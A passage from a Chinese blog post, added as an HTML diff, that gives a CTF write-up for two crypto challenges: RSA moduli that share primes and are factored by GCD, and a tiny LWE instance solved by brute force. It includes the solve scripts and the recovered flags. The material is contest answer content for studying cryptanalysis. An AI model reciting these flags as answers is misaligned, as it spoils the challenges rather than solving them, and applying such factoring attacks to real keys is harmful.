@@ -1,0 +1,1140 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/url.jpg">
+  <link rel="icon" href="/img/url.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="J_0k3r">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="昵称方可亲昵死你 惨得过喜欢这冤气 -《冤气》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2026DASCTF夏季赛">
+<meta property="og:url" content="http://example.com/2026/06/01/2026DASCTF%E5%A4%8F%E5%AD%A3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="J_0k3r">
+<meta property="og:description" content="昵称方可亲昵死你 惨得过喜欢这冤气 -《冤气》">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/3mm.jpg">
+<meta property="article:published_time" content="2026-06-01T05:14:59.000Z">
+<meta property="article:modified_time" content="2026-06-01T08:20:19.131Z">
+<meta property="article:author" content="J_0k3r">
+<meta property="article:tag" content="比赛Write Up">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/3mm.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2026DASCTF夏季赛 - J_0k3r</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":180,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"python"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"41fc030db57d5570dd22f78997dc4a7e","google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>J_0k3r的无人之境</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/playlist/" target="_self">
+                <i class="iconfont icon-music"></i>
+                <span>音乐</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/zkw.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2026DASCTF夏季赛"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        J_0k3r
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-06-01 13:14" pubdate>
+          2026年6月1日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          53 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2026DASCTF夏季赛</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年6月1日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="three-friends"><a href="#three-friends" class="headerlink" title="three_friends"></a>three_friends</h3><p>题目</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&quot;***********&quot;</span><br><br>L = <span class="hljs-built_in">len</span>(flag)<br>m1 = bytes_to_long(flag[:L//<span class="hljs-number">3</span>])<br>m2 = bytes_to_long(flag[L//<span class="hljs-number">3</span>:<span class="hljs-number">2</span>*L//<span class="hljs-number">3</span>])<br>m3 = bytes_to_long(flag[<span class="hljs-number">2</span>*L//<span class="hljs-number">3</span>:])<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>r = getPrime(<span class="hljs-number">512</span>)<br><br>e = <span class="hljs-number">65537</span><br><br>n1 = p * q<br>n2 = q * r<br>n3 = p * r<br><br>c1 = <span class="hljs-built_in">pow</span>(m1, e, n1)<br>c2 = <span class="hljs-built_in">pow</span>(m2, e, n2)<br>c3 = <span class="hljs-built_in">pow</span>(m3, e, n3)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n1 = <span class="hljs-subst">&#123;n1&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n2 = <span class="hljs-subst">&#123;n2&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n3 = <span class="hljs-subst">&#123;n3&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c1 = <span class="hljs-subst">&#123;c1&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c2 = <span class="hljs-subst">&#123;c2&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c3 = <span class="hljs-subst">&#123;c3&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n1 = 110479112338979326841231465480900311437095583241804968504367003268478785311645575853029227541889465070127417880290972698509502098875302777600751062235679028180932171554996023850242418398546147652141811910224228666917788640895453721648601609529326886128507435254380985821439510394329605362511800619781782498829</span><br><span class="hljs-string">n2 = 95225891725804035729098697183853172993650305271540351260130976375990969994680256179992972429701670943885218431291657615581872984046365977866046911929212400122026478512046580419614160900113488336302811792780327677539930592604198331529856760869923384410189400614767668529075682332352478496830621674767765967989</span><br><span class="hljs-string">n3 = 111603865467493745511917065096450766019551858630764507502030413922630178420561431122201021143404521026218410173550594126191240832822627851633700772093095150654117699219949636045712687320990198957564564857885138504872560550777788915442814980338401072475446362026076893466520135409327492048388030114969050367401</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c1 = 83456548767677952158133165776385438048214812740470347872014544040241661979735585698444752238351578159480247608435786172021153411975720140472715451216442036398970558532828923787921375318802867775369825882219621531795085442575971814645729572790836415339290407608988460626504016819536559945368010686567075802413</span><br><span class="hljs-string">c2 = 55598291653542627898994967211126815679185160762475277667203320398466974811147081936849639204784572327753766773503264941715352990434513737784771805183050575481575095545922660276426069697449001567347723946016416649932633528235458091960122921036028416845355866656581114844470311590282808396786169332755296721792</span><br><span class="hljs-string">c3 = 99617304265145206462280689337024202287720390645940568836285315412577937662785727570612881726190729195621460858194592258472873348744392240254689998279616123901037173010035977506212880680604466077172284894508163086916852071659627506881093976971048133795462670278664801263633610021626528113016267024450025017002</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>题目将 flag 分成三段，分别用 RSA 加密。关键点在于三个模数 <strong>共享质因子</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">n1 = p * q<br>n2 = q * r<br>n3 = p * r<br></code></pre></td></tr></table></figure>
+
+<p>三个模数两两之间都有一个公共质因子，这就是题目名 “three friends” 的含义。</p>
+<h4 id="1-利用-GCD-分解模数"><a href="#1-利用-GCD-分解模数" class="headerlink" title="1. 利用 GCD 分解模数"></a>1. 利用 GCD 分解模数</h4><p>由于 n1 和 n2 共享质因子 q：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">q = gcd(n1, n2)<br>p = n1 // q<br>r = n2 // q<br></code></pre></td></tr></table></figure>
+
+<p>验证：<code>p*q == n1</code>, <code>q*r == n2</code>, <code>p*r == n3</code> ✓</p>
+<h4 id="2-分别计算私钥并解密"><a href="#2-分别计算私钥并解密" class="headerlink" title="2. 分别计算私钥并解密"></a>2. 分别计算私钥并解密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">phi1 = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>phi2 = (q-<span class="hljs-number">1</span>) * (r-<span class="hljs-number">1</span>)<br>phi3 = (p-<span class="hljs-number">1</span>) * (r-<span class="hljs-number">1</span>)<br><br>d1 = inverse(e, phi1)<br>d2 = inverse(e, phi2)<br>d3 = inverse(e, phi3)<br><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, n2)<br>m3 = <span class="hljs-built_in">pow</span>(c3, d3, n3)<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-拼接得到-flag"><a href="#3-拼接得到-flag" class="headerlink" title="3. 拼接得到 flag"></a>3. 拼接得到 flag</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = long_to_bytes(m1) + long_to_bytes(m2) + long_to_bytes(m3)<br></code></pre></td></tr></table></figure>
+
+<h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, GCD, inverse<br><br>n1 = <span class="hljs-number">110479112338979326841231465480900311437095583241804968504367003268478785311645575853029227541889465070127417880290972698509502098875302777600751062235679028180932171554996023850242418398546147652141811910224228666917788640895453721648601609529326886128507435254380985821439510394329605362511800619781782498829</span><br>n2 = <span class="hljs-number">95225891725804035729098697183853172993650305271540351260130976375990969994680256179992972429701670943885218431291657615581872984046365977866046911929212400122026478512046580419614160900113488336302811792780327677539930592604198331529856760869923384410189400614767668529075682332352478496830621674767765967989</span><br>n3 = <span class="hljs-number">111603865467493745511917065096450766019551858630764507502030413922630178420561431122201021143404521026218410173550594126191240832822627851633700772093095150654117699219949636045712687320990198957564564857885138504872560550777788915442814980338401072475446362026076893466520135409327492048388030114969050367401</span><br>e = <span class="hljs-number">65537</span><br>c1 = <span class="hljs-number">83456548767677952158133165776385438048214812740470347872014544040241661979735585698444752238351578159480247608435786172021153411975720140472715451216442036398970558532828923787921375318802867775369825882219621531795085442575971814645729572790836415339290407608988460626504016819536559945368010686567075802413</span><br>c2 = <span class="hljs-number">55598291653542627898994967211126815679185160762475277667203320398466974811147081936849639204784572327753766773503264941715352990434513737784771805183050575481575095545922660276426069697449001567347723946016416649932633528235458091960122921036028416845355866656581114844470311590282808396786169332755296721792</span><br>c3 = <span class="hljs-number">99617304265145206462280689337024202287720390645940568836285315412577937662785727570612881726190729195621460858194592258472873348744392240254689998279616123901037173010035977506212880680604466077172284894508163086916852071659627506881093976971048133795462670278664801263633610021626528113016267024450025017002</span><br><br><span class="hljs-comment"># Step 1: 利用 GCD 分解模数</span><br>q = GCD(n1, n2)<br>p = n1 // q<br>r = n2 // q<br><br><span class="hljs-comment"># 验证分解正确性</span><br><span class="hljs-keyword">assert</span> p * q == n1<br><span class="hljs-keyword">assert</span> q * r == n2<br><span class="hljs-keyword">assert</span> p * r == n3<br><br><span class="hljs-comment"># Step 2: 计算私钥</span><br>phi1 = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>phi2 = (q - <span class="hljs-number">1</span>) * (r - <span class="hljs-number">1</span>)<br>phi3 = (p - <span class="hljs-number">1</span>) * (r - <span class="hljs-number">1</span>)<br><br>d1 = inverse(e, phi1)<br>d2 = inverse(e, phi2)<br>d3 = inverse(e, phi3)<br><br><span class="hljs-comment"># Step 3: 解密</span><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, n2)<br>m3 = <span class="hljs-built_in">pow</span>(c3, d3, n3)<br><br><span class="hljs-comment"># Step 4: 拼接 flag</span><br>flag = long_to_bytes(m1) + long_to_bytes(m2) + long_to_bytes(m3)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">DASCTF&#123;thr33_fri3nds_sh@r3_pr1m3s!!&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="lattice-oracle"><a href="#lattice-oracle" class="headerlink" title="lattice_oracle"></a>lattice_oracle</h3><p>Flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">DASCTF&#123;LWE_l4tt1c3_r3duct10n_i5_p0w3rful!&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目实现了一个 Learning With Errors (LWE) 问题，参数极小：</p>
+<ul>
+<li>维度 <code>n = 6</code></li>
+<li>模数 <code>q = 97</code></li>
+<li>样本数 <code>m = 30</code></li>
+<li>秘密向量 <code>s</code> 的每个分量在 <code>&#123;0, 1, 2, 3&#125;</code> 中</li>
+<li>误差 <code>e_i ∈ &#123;-1, 0, 1&#125;</code></li>
+</ul>
+<p>加密方式为 AES-CBC，密钥由 <code>sha256(str(s))</code> 的前 16 字节派生。</p>
+<h4 id="LWE-方程组"><a href="#LWE-方程组" class="headerlink" title="LWE 方程组"></a>LWE 方程组</h4><p><img src="https://cdn.nlark.com/yuque/__latex/3cc22e0a35ad7e57f831f02ae29b3405.svg" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>其中 <img src="https://cdn.nlark.com/yuque/__latex/5d496a3b872073b90e3b920cacfc3dc6.svg" srcset="/img/loading.gif" lazyload alt="image"> 是已知的随机向量，<img src="https://cdn.nlark.com/yuque/__latex/2a1e6a280559d96bdb68224b12ce4487.svg" srcset="/img/loading.gif" lazyload alt="image"> 是已知的输出，<img src="https://cdn.nlark.com/yuque/__latex/79ce3c7a71877c2ff01695e38ade43ca.svg" srcset="/img/loading.gif" lazyload alt="image"> 是未知的秘密向量，<img src="https://cdn.nlark.com/yuque/__latex/8507ddf7e70d9cef53799b8850b2f507.svg" srcset="/img/loading.gif" lazyload alt="image"> 是小误差。</p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>由于参数极小（<code>n=6</code>，<code>s[i] ∈ &#123;0,1,2,3&#125;</code>），秘密空间仅有 <img src="https://cdn.nlark.com/yuque/__latex/17b77e50d9e136f166f267f4af649cb9.svg" srcset="/img/loading.gif" lazyload alt="image"> 种可能，可以直接暴力枚举。</p>
+<p>对每个候选秘密 <img src="https://cdn.nlark.com/yuque/__latex/79ce3c7a71877c2ff01695e38ade43ca.svg" srcset="/img/loading.gif" lazyload alt="image">，计算所有样本的误差 <img src="https://cdn.nlark.com/yuque/__latex/ec6732afcd6efd5b48fcf977e8a3853e.svg" srcset="/img/loading.gif" lazyload alt="image">，检查是否所有误差都在 <img src="https://cdn.nlark.com/yuque/__latex/9f6f79705b6ee73ac99ca29e5bd5e05b.svg" srcset="/img/loading.gif" lazyload alt="image">（即 <img src="https://cdn.nlark.com/yuque/__latex/962397c04e9ebc38016319c3f3acd5fb.svg" srcset="/img/loading.gif" lazyload alt="image">）范围内。</p>
+<p>找到正确的 <img src="https://cdn.nlark.com/yuque/__latex/79ce3c7a71877c2ff01695e38ade43ca.svg" srcset="/img/loading.gif" lazyload alt="image"> 后，用 <code>sha256(str(s))</code> 派生 AES 密钥，解密得到 flag。</p>
+<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>n = <span class="hljs-number">6</span><br>q = <span class="hljs-number">97</span><br>m = <span class="hljs-number">30</span><br><br>A = [[<span class="hljs-number">94</span>, <span class="hljs-number">13</span>, <span class="hljs-number">86</span>, <span class="hljs-number">94</span>, <span class="hljs-number">69</span>, <span class="hljs-number">11</span>], [<span class="hljs-number">54</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">11</span>, <span class="hljs-number">27</span>, <span class="hljs-number">29</span>], [<span class="hljs-number">77</span>, <span class="hljs-number">3</span>, <span class="hljs-number">71</span>, <span class="hljs-number">25</span>, <span class="hljs-number">91</span>, <span class="hljs-number">83</span>],<br>     [<span class="hljs-number">69</span>, <span class="hljs-number">53</span>, <span class="hljs-number">28</span>, <span class="hljs-number">57</span>, <span class="hljs-number">75</span>, <span class="hljs-number">35</span>], [<span class="hljs-number">20</span>, <span class="hljs-number">89</span>, <span class="hljs-number">54</span>, <span class="hljs-number">43</span>, <span class="hljs-number">35</span>, <span class="hljs-number">19</span>], [<span class="hljs-number">43</span>, <span class="hljs-number">13</span>, <span class="hljs-number">11</span>, <span class="hljs-number">48</span>, <span class="hljs-number">12</span>, <span class="hljs-number">45</span>],<br>     [<span class="hljs-number">77</span>, <span class="hljs-number">33</span>, <span class="hljs-number">5</span>, <span class="hljs-number">93</span>, <span class="hljs-number">58</span>, <span class="hljs-number">68</span>], [<span class="hljs-number">48</span>, <span class="hljs-number">10</span>, <span class="hljs-number">70</span>, <span class="hljs-number">37</span>, <span class="hljs-number">80</span>, <span class="hljs-number">79</span>], [<span class="hljs-number">73</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">84</span>],<br>     [<span class="hljs-number">37</span>, <span class="hljs-number">10</span>, <span class="hljs-number">29</span>, <span class="hljs-number">12</span>, <span class="hljs-number">48</span>, <span class="hljs-number">35</span>], [<span class="hljs-number">81</span>, <span class="hljs-number">46</span>, <span class="hljs-number">20</span>, <span class="hljs-number">47</span>, <span class="hljs-number">45</span>, <span class="hljs-number">26</span>], [<span class="hljs-number">34</span>, <span class="hljs-number">89</span>, <span class="hljs-number">87</span>, <span class="hljs-number">82</span>, <span class="hljs-number">9</span>, <span class="hljs-number">77</span>],<br>     [<span class="hljs-number">21</span>, <span class="hljs-number">68</span>, <span class="hljs-number">93</span>, <span class="hljs-number">31</span>, <span class="hljs-number">20</span>, <span class="hljs-number">59</span>], [<span class="hljs-number">34</span>, <span class="hljs-number">81</span>, <span class="hljs-number">88</span>, <span class="hljs-number">71</span>, <span class="hljs-number">28</span>, <span class="hljs-number">87</span>], [<span class="hljs-number">77</span>, <span class="hljs-number">29</span>, <span class="hljs-number">4</span>, <span class="hljs-number">40</span>, <span class="hljs-number">51</span>, <span class="hljs-number">34</span>],<br>     [<span class="hljs-number">27</span>, <span class="hljs-number">72</span>, <span class="hljs-number">91</span>, <span class="hljs-number">40</span>, <span class="hljs-number">27</span>, <span class="hljs-number">83</span>], [<span class="hljs-number">50</span>, <span class="hljs-number">82</span>, <span class="hljs-number">58</span>, <span class="hljs-number">18</span>, <span class="hljs-number">33</span>, <span class="hljs-number">17</span>], [<span class="hljs-number">95</span>, <span class="hljs-number">71</span>, <span class="hljs-number">68</span>, <span class="hljs-number">33</span>, <span class="hljs-number">95</span>, <span class="hljs-number">74</span>],<br>     [<span class="hljs-number">74</span>, <span class="hljs-number">51</span>, <span class="hljs-number">46</span>, <span class="hljs-number">28</span>, <span class="hljs-number">17</span>, <span class="hljs-number">65</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">96</span>, <span class="hljs-number">6</span>, <span class="hljs-number">14</span>, <span class="hljs-number">19</span>, <span class="hljs-number">80</span>], [<span class="hljs-number">87</span>, <span class="hljs-number">54</span>, <span class="hljs-number">76</span>, <span class="hljs-number">8</span>, <span class="hljs-number">49</span>, <span class="hljs-number">48</span>],<br>     [<span class="hljs-number">59</span>, <span class="hljs-number">67</span>, <span class="hljs-number">32</span>, <span class="hljs-number">70</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>], [<span class="hljs-number">14</span>, <span class="hljs-number">87</span>, <span class="hljs-number">68</span>, <span class="hljs-number">96</span>, <span class="hljs-number">34</span>, <span class="hljs-number">82</span>], [<span class="hljs-number">14</span>, <span class="hljs-number">37</span>, <span class="hljs-number">55</span>, <span class="hljs-number">20</span>, <span class="hljs-number">58</span>, <span class="hljs-number">0</span>],<br>     [<span 